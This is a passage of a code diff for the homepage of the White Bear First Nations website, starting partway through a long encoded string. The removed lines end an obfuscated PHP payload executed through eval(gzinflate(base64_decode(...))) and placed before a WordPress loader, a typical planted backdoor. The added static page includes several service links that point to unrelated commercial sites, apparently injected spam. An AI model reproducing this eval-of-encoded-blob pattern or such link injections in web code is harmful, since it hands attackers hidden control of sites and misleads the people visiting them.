\x2bGkO7WWTj1k/fGG\x42Ijjo\x41vyiHVGn8iSSLgky\x2b2yqtpkUVT5/J\x63pUS\x42StTIRt8D9m\x41sJ6QZSuqjnSgmyMjOd\x42zGQ\x63WI\x62HF\x43/dYLtR4FVi\x43Z0IS4\x63Lhlng4fj7R\x63PoXUd7hjvt\x2bFw\x41nEDR9TPty1\x2b51SQQhiO\x62sNlP\x43KT\x2bsMWs12VoqvL8\x43uivmU2\x62ks\x2bS4zdPIuus0ZV\x2bs\x61DuZ\x63WPU6hQiE\x61q\x61YfGz\x63NpzF\x2bxO8jkkji\x43gNhkU5TwU\x43gJhI\x43\x61ote/0WZ\x43jy\x2bPQ\x41EfwHxGw6\x62\x435jPi\x42njyelMf8E4QLREX0XrdfguK/s0Nfe2nL\x62\x43\x439Qs/umz0eiL\x41\x42MMQG85Q/7t3mME4IVZtM7\x62\x63gWvl\x61tSvwwOHP\x42LynL7GdSK/w7/pnX\x63f1/5Nqvvvu6jrU8L8\x63Li\x62\x61qO\x61trnu37X36wNv5ft\x62Q/PwG\x62on69tfxLfdh\x62m4e2/zvzM7ekPy6Hrn\x42O\x61ifzyze7r8n8dm06vf5tz\x61rrmW0\x61H\x41EPiYfe\x4112EhwFNHY2RJfTZO2Pkrn\x63EgxlNHoHYdgQEkjm6FZRoF5MJSMSRLi\x61h\x43\x63\x41MxR\x43DHDwLn3h\x41EfryY//k0mEdLXuprL7Vm1KNoknzWL2zM\x63O5ezP\x2b232tZ72tZ72tZ72tZ72tZ732ut\x62XwEMMO0uNyJe0q7SFF\x41t1ukS\x42wJe0q6SVF\x41tlukW\x42wJe0q5SlF\x41tVuk\x61\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+<?php require('blog.php'); ?>
+<!DOCTYPE html>
 
-?>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+<html>
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+<head>
+	<meta charset="utf-8">
+	<meta name="description" content="" />
+	<meta name="keywords" content="" />
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+	<title>White Bear First Nations</title>
+
+	<link rel="stylesheet" href="https://whitebearfirstnation.ca/res/css/grid.css" type="text/css" />
+	<link rel="stylesheet" href="https://whitebearfirstnation.ca/res/css/screen.css" type="text/css" />
+	<link rel="stylesheet" href="https://whitebearfirstnation.ca/res/css/fonts.css" type="text/css" />
+
+	<!--[if IE 8]>
+		<link rel="stylesheet" type="text/css" href="res/css/ie8.css">
+	<![endif]-->
+
+	<!--[if IE 7]>
+		<link rel="stylesheet" type="text/css" href="res/css/ie7.css">
+	<![endif]-->
+
+	<link rel="icon" type="image/ico" href="../favicon.ico" />
+
+	<script src="https://whitebearfirstnation.ca/res/js/jquery-1.7.min.js"></script>
+	<script src="https://whitebearfirstnation.ca/res/js/core.js"></script>
+
+	
+	<script type="text/javascript">
+
+	  var _gaq = _gaq || [];
+	  _gaq.push(['_setAccount', 'UA-10683530-9']);
+	  _gaq.push(['_trackPageview']);
+
+	  (function() {
+	    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+	    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+	    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+	  })();
+
+	</script>
+</head>
+<body class="index">
+
+<div id="everything">
+
+	<div id="wrap">
+
+		<div class="container_12 clearfix">
+
+			<div id="header" class="grid_12">
+
+				<div id="member_login">
+						<a class="login-btn" title="Member Login" href="http://whitebearfirstnation.ca/members-area">Member Login</a>
+	
+				</div>
+
+				<div id="logo" class="grid_12 alpha omega">
+					<a href="http://whitebearfirstnation.ca/index" title="White Bear First Nations">White Bear First Nations</a>
+				</div>
+			</div>
+
+
+			<div id="nav" class="grid_12">
+				<div class="menu">
+					<ul><li><a  class="active" href="http://whitebearfirstnation.ca/index">Home</a></li>
+<li><a  href="http://whitebearfirstnation.ca/about">About</a></li>
+<li><a  href="http://whitebearfirstnation.ca/news">News</a></li>
+<li><a  href="http://whitebearfirstnation.ca/events/job-opportunities">Events/Opportunities</a><ul><li><a  href="http://whitebearfirstnation.ca/events/job-opportunities">Job Opportunities</a></li>
+<li><a  href="http://whitebearfirstnation.ca/events/boards-and-committees-opportunities">Boards And Committees Opportunities</a></li>
+</ul>
+</li>
+<li><a  href="http://whitebearfirstnation.ca/programs-services">Programs &amp; Services</a><ul><li><a  href="http://whitebearfirstnation.ca/programs-services/white-bear-education-complex">White Bear Education Complex</a></li>
+<li><a  href="http://whitebearfirstnation.ca/programs-services/public-works">Public Works</a></li>
+<li><a  href="http://whitebearfirstnation.ca/programs-services/education">Post Secondary Education Center</a></li>
+<li><a  href="http://whitebearfirstnation.ca/programs-services/economic-development">Economic Development </a></li>
+<li><a  href="http://bankershallchiropractic.com">Health</a></li>
+<li><a  href="http://whitebearfirstnation.ca/programs-services/membership">Membership</a></li>
+<li><a  href="http://kdprofessional.ca">Taxation</a></li>
+<li><a  href="http://whitebearfirstnation.ca/programs-services/lands">Lands </a></li>
+<li><a  href="https://www.rogersinsurance.ca/commercial-insurance/industries-we-serve/">Income Assistance </a></li>
+</ul>
+</li>
+<li><a  href="http://whitebearfirstnation.ca/tourism-culture">Tourism</a></li>
+<li><a  href="http://whitebearfirstnation.ca/chief-council">Council</a></li>
+<li><a  href="http://whitebearfirstnation.ca/governance">Governance</a></li>
+<li><a  href="http://whitebearfirstnation.ca/links">Links</a></li>
+<li><a  href="http://whitebearfirstnation.ca/contact">Contact</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area">Members Area</a><ul><li><a  href="http://whitebearfirstnation.ca/members-area/audits">Audits</a><ul><li><a  href="http://whitebearfirstnation.ca/members-area/audits/2014-audit-and-financial-statements">2014 Audit and Financial Statements.</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/audits/2012-audit-and-financial-statements">2012 Audit and Financial Statements</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/audits/2013-audit-and-financial-statements">2013 Audit and Financial Statements</a></li>
+</ul>
+</li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/lands">Lands</a><ul><li><a  href="http://whitebearfirstnation.ca/members-area/lands/2007-lands-committee-minutes">2007 Lands Committee Minutes</a></li>
+</ul>
+</li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/white-bear-agm-minutes">White Bear AGM Minutes</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/board-of-education-minutes">Board of Education Minutes</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/legal">Legal</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/economic-development">Economic Development</a><ul><li><a  href="http://whitebearfirstnation.ca/members-area/economic-development/statement-of-oil-and-gas-revenues">Statement Of Oil and Gas Revenues</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/economic-development/corporation-meeting-minutes">Corporation Meeting Minutes</a></li>
+</ul>
+</li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/finance-and-agreements">Finance and Agreements</a><ul><li><a  href="http://whitebearfirstnation.ca/members-area/finance-and-agreements/band-based-capital-expenditures">Band Based Capital Expenditures</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/finance-and-agreements/2013-2016-health-contribution-agreement-program-plan">2013-2016  Health Contribution Agreement &amp; Program Plan</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/finance-and-agreements/capital-and-revenue-account-statement-of-accounts">Capital and Revenue Account Statement Of Accounts.</a></li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/finance-and-agreements/contribution-funding-agreement">Contribution Funding Agreement</a></li>
+</ul>
+</li>
+<li><a  href="http://whitebearfirstnation.ca/members-area/council-meeting-minutes">Council Meeting Minutes</a></li>
+</ul>
+</li>
+</ul>
+
+				</div>
+			</div>
+
+			<div id="home_featured" class="grid_12">
+				<img src="http://whitebearfirstnation.ca/res/img/council-offices.png" alt="White Bear First Nations - Council Offices" />
+
+				<h1>White Bear First Nations is located in Southeast corner of the Moose Mountain area of Saskatchewan and consists of four First Nations, Saulteaux, Cree, Nakota and Dakota.</h1>
+
+
+				<div class="clear"></div>
+
+				<a class="learnmore-btn" href="http://whitebearfirstnation.ca/about" title="Learn More About Us">Learn More About Us</a>
+				<a class="member-btn" href="http://whitebearfirstnation.ca/chief-council" title="Chief & Council Members">Chief & Council Members</a>
+
+			</div>
+
+			<div id="home_content" class="grid_12">
+
+				<div id="page_content" class="grid_8 alpha">
+					<div id="news_snippets">
+						<h2>What's New</h2>
+						<hr />
+						
+
+				<div class="news-item">
+					<div class="news-date"><div class="month">May</div><div class="day">8</div></div>
+					<div class="news-content">
+						<div class="news-title"><a href="http://whitebearfirstnation.ca/news/item/?n=44">White Bear First Nations Election Nomination Day May 8 2015 White Bear Community Hall</a></div>
+						<div class="news-clip">notice of nomination .pdf
+</div>
+						<a class="news-more" href="http://whitebearfirstnation.ca/news/item/?n=44">Read More</a>
+					</div>
+					<div class="clear"></div>
+				</div>
+				<div class="news-item">
+					<div class="news-date"><div class="month">Mar</div><div class="day">19</div></div>
+					<div class="news-content">
+						<div class="news-title"><a href="http://whitebearfirstnation.ca/news/item/?n=42">Updating of Off Reserve Members current Mailing Addresses for Election purposes</a></div>
+						<div class="news-clip">Due to the upcoming Election for Chief and Council set for June 19, 2015 the White Bear First Nations is requesting its Membership of Voting Age to send in their current Mailing Address to:
+&nbsp;&nbsp;&nbsp;&nbsp;...</div>
+						<a class="news-more" href="http://whitebearfirstnation.ca/news/item/?n=42">Read More</a>
+					</div>
+					<div class="clear"></div>
+				</div>
+				<div class="news-item">
+					<div class="news-date"><div class="month">Mar</div><div class="day">4</div></div>
+					<div class="news-content">
+						<div class="news-title"><a href="http://whitebearfirstnation.ca/news/item/?n=41">AANDC Letter for Expiry of Council Term and Appointment of Electoral Officer.</a></div>
+						<div class="news-clip">AANDC EXPIRY OF TERM OF OFFICE AND APPOINTMENT OF ELECTORIAL OFFICE Letter.pdf
+</div>
+						<a class="news-more" href="http://whitebearfirstnation.ca/news/item/?n=41">Read More</a>
+					</div>
+					<div class="clear"></div>
+				</div>
+					</div>
+
+					<div id="event_snippets">
+						<h2>Upcoming Events</h2>
+						<hr />
+						
+						
+<script type="text/javascript">
+$(document).ready(function(){
+
+	// Get all events for selected day
+	$('.calendar div.active').live('click', function() {
+		$('.calendar-upcoming').show();
+		var t = setTimeout(function(){$('#events').html('<div class="events-loading">Loading events...</div>');}, 250);
+		var day = $('.calendar').data('year')+'-'+$('.calendar').data('month')+'-'+$(this).html();
+		var jas = new JAS({
+			api: "events.get_events_on_day",
+			data: {
+				"day" : day,
+				"url" : 'events/item'
+			},
+			success: function(r) {
+				clearTimeout(t);
+				$('#events').html(r.data.events);
+				$('h2.event-list-title').html(r.data.page_title);
+			}
+		}).invoke();
+	});
+
+	// Change calendar month
+	$('.calendar-prev a, .calendar-next a').live('click', function(){
+		var month = $(this).data('month');
+		var year = $(this).data('year');
+		var jas = new JAS({
+			api: "events.change_month",
+			data: {
+				"month" : month,
+				"year" : year
+			},
+			success: function(r) {
+				$('#calendar').html(r.data.calendar);
+			}
+		}).invoke();
+	});
+
+	// Show upcoming events
+});
+</script>
+
+<div id="calendar">
+	<div class="calendar" data-month="09" data-year="2015"><div class="calendar-header"><span class="calendar-prev"><a data-month="08" data-year="2015">&laquo;</a></span><span class="month-year">September 2015</span><span class="calendar-next"><a data-month="10" data-year="2015">&raquo;</a></span></div><div><div class="dow">Sun</div><div class="dow">Mon</div><div class="dow">Tue</div><div class="dow">Wed</div><div class="dow">Thu</div><div class="dow">Fri</div><div class="dow last-day">Sat</div></div><div class="row"><div class="day empty">&nbsp;</div><div class="day empty">&nbsp;</div><div class="day">1</div><div class="day">2</div><div class="day">3</div><div class="day">4</div><div class="day last-day">5</div></div><div class="row"><div class="day">6</div><div class="day">7</div><div class="day">8</div><div class="day">9</div><div class="day">10</div><div class="day">11</div><div class="day last-day">12</div></div><div class="row"><div class="day">13</div><div class="day">14</div><div class="day">15</div><div class="day">16</div><div class="day">17</div><div class="day">18</div><div class="day last-day">19</div></div><div class="row"><div class="day">20</div><div class="day today">21</div><div class="day">22</div><div class="day">23</div><div class="day">24</div><div class="day">25</div><div class="day last-day">26</div></div><div class="row"><div class="day">27</div><div class="day">28</div><div class="day">29</div><div class="day">30</div><div class="day empty">&nbsp;</div><div class="day empty">&nbsp;</div><div class="day empty last-day">&nbsp;</div></div></div></div>
+
+<!--<div class="calendar-upcoming">
+	<a href="javascript:location.reload(true)">Show upcoming events</a>
+</div>-->
+
+
+
+						<h2 class="event-list-title">All Events</h2>
+
+						
+<p>No events at this time.</p><br />
+<h2></h2>
+<p></p>
+
+
+					</div>
+				</div>
+
+				<div id="sidebar" class="grid_4 omega">
+					<div id="chief_message">
+						<h2>Chief's Message</h2>
+						<hr />
+						<p><img alt="" src="+pub/image/chief-brian-standingready.png" style="width: 124px; height: 148px; float: right; margin-left: 10px; margin-right: 10px;" />Brian has held a variety of positions including Chief, Council member, and Band Manager at the White Bear First Nations. He has also served as the district representative for the Yorkton Tribal Council and has sat on numerous boards, committees and commissions. Chief Standingready was re-elected as Chief of White Bear First Nations in 2013.</p>
+
+						<a href="http://whitebearfirstnation.ca/chief-council" class="read-more">Read More</a>
+					</div>
+
+					<!--<div id="poll">
+                    	{"api":"poll.vote"}
+					</div>-->
+					<br />
+
+					<div id="streaming">
+						<h2>CIDD 97.7 The Moose</h2>
+						<hr />
+						<a class="read-more" href="http://cidd.streamon.fm/" target=_blank>Listen to Live Stream</a>
+					</div>
+
+					<br />
+					<div id="contact_info">
+						<h2>Stay Connected</h2>
+						<hr />
+						<h3>White Bear First Nations</h3>
+
+						<table>
+							<tr>
+								<td width="50"><p><span>Mail</span></p></td>
+								<td><p>Box 700 Carlyle SK, S0C 0R0</p><br /></td>
+							</tr>
+							<tr>
+								<td><p><span>Phone</span></p></td>
+								<td><p>306-577-2461 - <i>Admin Office</i><br/>306-577-4553 - <i>Council Office</i></p><br /></td>
+							</tr>
+							<tr>
+								<td><p><span>Fax</span></p></td>
+								<td><p>306-577-2496 - <i>Admin Office</i><br/>306-577-4363 - <i>Council Office</i></p></td>
+							</tr>
+						</table>
+					</div>
+
+					<br />
+					<div id="newsletter">
+						<h2>Subscribe</h2>
+						<hr />
+						<p>Sign Up for Our Mailing List</p>
+
+						
+							<div id="mc_embed_signup">
+							<form action="http://whitebearfirstnation.us5.list-manage.com/subscribe/post?u=eb0ec63abafe9ef6028a6a45c&amp;id=317eaab046" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank">
+							<div class="mc-field-group">
+								<input type="email" value="Your Email Address" onfocus="if(this.value==this.defaultValue) this.value='';" name="EMAIL" class="required email" id="mce-EMAIL">
+								<input type="submit" value="Sign Up" name="subscribe" id="mc-embedded-subscribe" class="button">
+							</div>
+								<div id="mce-responses" class="clear">
+									<div class="response" id="mce-error-response" style="display:none"></div>
+									<div class="response" id="mce-success-response" style="display:none"></div>
+								</div>	<div class="clear"></div>
+							</form>
+							</div>
+						
+					</div>
+				</div>
+			</div>
+
+			<div id="footer" class="grid_12">
+				<p class="copyright">Copyright  2015 - White Bear First Nations. All Rights Reserved.</p>
+				<p class="powered">Powered by <a href="http://ohmedia.ca" target="_blank" title="OH! Media - Regina Web Design and Development">OH! Media</a> a division of <a href="http://thephoenixgroup.ca" target="_blank" title="Phoenix Group Advertising">Phoenix Group</a></p>
+			</div>
+
+		</div>
+
+	</div>
+
+</div>
+
+</body>
+</html>
